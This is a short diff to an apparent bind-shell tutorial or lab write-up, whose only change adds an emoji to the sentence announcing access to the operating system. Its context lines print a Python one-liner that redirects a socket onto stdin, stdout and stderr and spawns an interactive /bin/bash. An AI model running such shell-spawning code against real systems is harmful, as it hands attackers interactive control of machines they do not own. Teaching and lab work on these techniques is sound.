@@ -233,7 +233,7 @@ You could see the status is open. Now is the time to connect to the bind shell w
 
 	`import pty,os;os.dup2(r.fileno(),0);os.dup2(r.fileno(),1);os.dup2(r.fileno(),2);pty.spawn("/bin/bash");s.close()`
 
-and BOOM! You got access to the operating system.
+and BOOM💥! You got access to the operating system.
 
 ---
 
